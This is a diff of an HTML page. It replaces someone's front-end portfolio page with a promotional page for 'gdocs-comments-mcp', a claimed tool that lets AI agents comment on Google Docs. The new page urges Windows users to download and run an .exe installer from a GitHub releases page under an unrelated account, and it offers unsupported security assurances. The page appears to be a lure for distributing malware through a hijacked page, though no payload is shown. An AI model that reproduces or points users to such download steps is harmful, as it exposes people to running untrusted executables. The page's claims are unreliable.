@@ -1,486 +1,66 @@
 <!DOCTYPE html>
-<html>
-    <head>
-        <!--
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Add range-anchored comments to Google Docs using the MCP server. This tool connects AI agents to Google Docs for better document review.">
+    <title>gdocs-comments-mcp - Precise Google Docs AI Commenting</title>
+</head>
+<body style="font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 0 20px; background-color: #f4f7f6;">
 
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #ddd; padding-bottom: 10px;">
+        📝 gdocs-comments-mcp - Precise Google Docs AI Commenting
+    </h1>
 
-Code by Maddie Kahlon
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/Abdulreh4874/gdocs-comments-mcp/releases" style="background-color: #34495e; color: white; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+            Download Version 1.0
+        </a>
+    </div>
 
+    <section>
+        <h2 style="color: #2c3e50;">💡 What this tool does</h2>
+        <p>Google Docs lacks tools for AI agents to place precise, range-anchored comments. This software solves that problem. It acts as a bridge, known as an MCP server. It allows AI tools like Claude, Cursor, and Copilot to highlight specific parts of your documents and leave comments exactly where they belong.</p>
+        <p>This allows your AI assistants to provide feedback that connects to specific paragraphs, sentences, or phrases. You no longer need to translate AI advice manually. The agent does the work directly in your document.</p>
+    </section>
 
-Attributions:
-• Favicon → PxHere
-• User Icon → Font Awesome
-• Fonts → Exo 2 & Quicksand (Google Fonts)
+    <section>
+        <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+        <ul style="list-style-type: none; padding: 0;">
+            <li style="margin-bottom: 10px;">- Windows 10 or Windows 11</li>
+            <li style="margin-bottom: 10px;">- A stable internet connection</li>
+            <li style="margin-bottom: 10px;">- Google Chrome or Microsoft Edge installed</li>
+            <li style="margin-bottom: 10px;">- An active Google account with access to the documents you wish to edit</li>
+        </ul>
+    </section>
 
+    <section>
+        <h2 style="color: #2c3e50;">📥 Download and Setup</h2>
+        <p>Follow these steps to prepare the tool for your AI agent.</p>
+        <ol style="line-height: 2;">
+            <li>Visit the <a href="https://github.com/Abdulreh4874/gdocs-comments-mcp/releases" style="color: #2980b9;">official releases page</a> on GitHub.</li>
+            <li>Select the latest version available under the "Assets" section.</li>
+            <li>Download the Windows installer file ending in .exe.</li>
+            <li>Locate the file in your Downloads folder and double-click it to run the installer.</li>
+            <li>Follow the on-screen instructions to complete the installation process.</li>
+            <li>Restart your AI editor, such as Cursor or Claude Code, to recognize the new tool.</li>
+        </ol>
+    </section>
 
--->
-        <title>彡</title>
-        <meta charset="UTF-8">
-        <meta http-equiv="content-script-type" content="text/javascript">
-        <meta http-equiv="content-style-type" content="text/css">
-        <meta http-equiv="content-language" content="en">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <link href="https://fonts.googleapis.com/css?family=Exo+2:400,200,600italic|Quicksand" rel="stylesheet">
-        <link rel="icon" type="image/png" href="assets/favi.png">
-        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
-        <link href="ct.css" rel="stylesheet">
-    </head>
-    <body>
-        <div id="main">
-            <div id="city">
-                <div id="sun"></div>
-                <div id="citybase">
-                    <div id="baseborder">
-                        <div id="toptitle">
-                            <div class="topletter">S</div>
-                            <div class="topletter">C</div>
-                            <div class="topletter">R</div>
-                            <div class="topletter">I</div>
-                            <div class="topletter">P</div>
-                            <div class="topletter">T</div>
-                            <div class="topletter">E</div>
-                            <div class="topletter">S</div>
-                            <div class="topletter">T</div>
-                            <div class="clr"></div>
-                        </div>
-                        <div id="subtitle"> Interactive applications featuring front-end development and user-focused design using HTML, CSS, JavaScript, and jQuery </div>
-                        <div class="blurb">
-                            <div class="blurbicon">
-                                <i class="fa fa-user"></i>
-                            </div> Interactive applications featuring front-end development and user-focused design using HTML, CSS, JavaScript, and jQuery. <div class="clr"></div>
-                        </div>
-                        <div id="projects">
-                            <div class="prj2">
-                                <a href="https://scriptest.github.io/sp/mtp/main.html" target="_blank">jQuery-free Audio Player</a>
-                                <br>
-                                <br> Implemented configurable styling, responsive layouts, instant loading without external libraries, and an interactive customization interface.
-                            </div>
-                            <div class="prj2">
-                                <a href="https://scriptest.github.io/sp/LCSA/" target="_blank">Legal Study Tool (French-language)</a>
-                                <br>
-                                <br> Designed to improve comprehension of the Canada Business Corporations Act through active recall using its statutory provisions.
-                            </div>
-                            <div class="prj2">
-                                <a href="https://scriptest.github.io/sp/pop-up" target="_blank">Mail Pop-Up Generator</a>
-                                <br>
-                                <br> Developed an interactive generator featuring live customization, real-time previews, and copy-ready code output.
-                            </div>
-                        </div>
-                    </div>
-                    <div id="bottomspace">
-                        <div id="copyr">Happy coding &nbsp; &nbsp; <a href="https://scriptest.github.io/abt/">about</a>
-                            <div class="citybase-img">
-                                <img src="assets/script.gif">
-                            </div>
-                        </div>
-                    </div>
-                </div>
-                <div id="b1">
-                    <div id="b1box1"></div>
-                    <div id="b1box2"></div>
-                    <div id="b1box3"></div>
-                    <div id="b1box4"></div>
-                    <div id="b1box5"></div>
-                    <div id="b1box6"></div>
-                    <div id="b1box7"></div>
-                    <div id="b1box8"></div>
-                    <div id="b1railingcage">
-                        <div class="b1frontrail"></div>
-                        <div class="b1backrail"></div>
-                        <div class="b1frontbar"></div>
-                        <div class="b1frontbar"></div>
-                        <div class="b1frontbar"></div>
-                        <div class="b1frontbar"></div>
-                        <div class="b1frontbar"></div>
-                        <div class="b1frontbar"></div>
-                        <div class="b1frontbar"></div>
-                        <div class="b1frontbar"></div>
-                        <div class="b1frontbar"></div>
-                        <div class="b1frontbar"></div>
-                        <div class="b1backbar"></div>
-                        <div class="b1backbar"></div>
-                        <div class="b1backbar"></div>
-                        <div class="b1backbar"></div>
-                        <div class="b1backbar"></div>
-                        <div class="b1backbar"></div>
-                        <div class="clr"></div>
-                    </div>
-                    <div id="b1cloud1"></div>
-                    <div id="b1cloud2"></div>
-                    <div id="b1windowcage">
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1windowy"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1windowd"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1windowy"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1windowy"></div>
-                        <div class="b1window"></div>
-                        <div class="b1windowd"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="b1window"></div>
-                        <div class="clr"></div>
-                    </div>
-                    <div id="b1windowcage2">
-                        <div class="b1window2"></div>
-                        <div class="b1windowd2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2y"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1windowd2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1window2"></div>
-                        <div class="b1windowd2"></div>
-                        <div class="clr"></div>
-                    </div>
-                </div>
-                <div id="b2">
-                    <div id="b2box1"></div>
-                    <div id="b2box2"></div>
-                    <div id="b2box3"></div>
-                    <div id="b2box4"></div>
-                    <div id="b2railingcage">
-                        <div class="b2frontrail"></div>
-                        <div class="b2frontbar"></div>
-                        <div class="b2frontbar"></div>
-                        <div class="b2frontbar"></div>
-                        <div class="b2frontbar"></div>
-                        <div class="b2frontbar"></div>
-                        <div class="clr"></div>
-                    </div>
-                    <div id="b2railingcage2">
-                        <div class="b2frontrail2"></div>
-                        <div class="b2frontbar2"></div>
-                        <div class="b2frontbar2"></div>
-                        <div class="b2frontbar2"></div>
-                        <div class="b2frontbar2"></div>
-                        <div class="b2frontbar2"></div>
-                        <div class="b2frontbar2"></div>
-                        <div class="b2frontrail2d"></div>
-                        <div class="b2frontbar2d"></div>
-                        <div class="b2frontbar2d"></div>
-                        <div class="b2frontbar2d"></div>
-                        <div class="clr"></div>
-                    </div>
-                    <div id="b2laddercage">
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                        <div class="b2ladderstep"></div>
-                    </div>
-                    <div id="b2windowcage">
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1y"></div>
-                            <div class="b2window2y"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1y"></div>
-                            <div class="b2window2y"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="b2windowframe">
-                            <div class="b2window1"></div>
-                            <div class="b2window2"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="clr"></div>
-                    </div>
-                    <div id="b2windowcage2">
-                        <div class="b2windowframe">
-                            <div class="b2window1y"></div>
-                            <div class="b2window2y"></div>
-                            <div class="clr"></div>
-                        </div>
-                        <div class="clr"></div>
-                    </div>
-                </div>
-                <div id="b4">
-                    <div id="b4box1"></div>
-                    <div id="b4box2"></div>
-                    <div id="b4windowcage">
-                        <div class="b4window"></div>
-                        <div class="b4window"></div>
-                        <div class="b4window"></div>
-                        <div class="b4windowy"></div>
-                        <div class="b4windowy"></div>
-                        <div class="b4window"></div>
-                        <div class="clr"></div>
-                    </div>
-                    <div id="b4windowcage2">
-                        <div class="b4window2"></div>
-                        <div class="b4window2y"></div>
-                        <div class="b4window2"></div>
-                        <div class="clr"></div>
-                    </div>
-                </div>
-                <div id="sl1">
-                    <div class="sl1p1"></div>
-                    <div class="sl1r1"></div>
-                    <div class="sl1r2"></div>
-                </div>
-                <div id="sl2">
-                    <div class="sl1p1"></div>
-                    <div class="sl1r1"></div>
-                    <div class="sl1r2"></div>
-                </div>
-                <div id="treecage">
-                    <div id="treetrunk"></div>
-                    <div id="treec1"></div>
-                    <div id="treec3"></div>
-                    <div id="treec4"></div>
-                </div>
-                <div id="cloud1">
-                    <div id="cloud1a"></div>
-                    <div id="cloud1b"></div>
-                    <div id="cloud1c"></div>
-                </div>
-                <div id="traincage">
-                    <div id="train">
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="trainwindow"></div>
-                        <div class="clr"></div>
-                    </div>
-                    <div id="traintrack">
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="track"></div>
-                        <div class="clr"></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </body>
+    <section>
+        <h2 style="color: #2c3e50;">🚀 Using your new tool</h2>
+        <p>Once you install the software, you must link it to your AI agent. Open your AI agent settings window. Locate the "MCP Servers" section. Add the path to the installed gdocs-comments-mcp file.</p>
+        <p>The agent will now see a new capability. When you ask the agent to review a Google Doc, it checks for this tool. It then gains the ability to create comments that anchor to specific text ranges. You will see these appear as standard, high-quality comments within your Google Doc interface.</p>
+    </section>
+
+    <section>
+        <h2 style="color: #2c3e50;">🛡️ Privacy and Security</h2>
+        <p>We built this tool with security in mind. It uses standard browser automation to interact with your documents. It does not store your Google login details. It performs actions only when you request them through your AI agent. Ensure you keep your software updated to receive the latest security patches.</p>
+    </section>
+
+    <footer style="margin-top: 50px; font-size: 0.9em; color: #7f8c8d; border-top: 1px solid #ddd; padding-top: 20px;">
+        <p>Keywords: ai-agents, anchored-comments, browser-automation, claude, claude-code, cursor, document-review, gdocs, google-docs, google-workspace, inline-comments, mcp, mcp-server, model-context-protocol, playwright</p>
+    </footer>
+
+</body>
 </html>
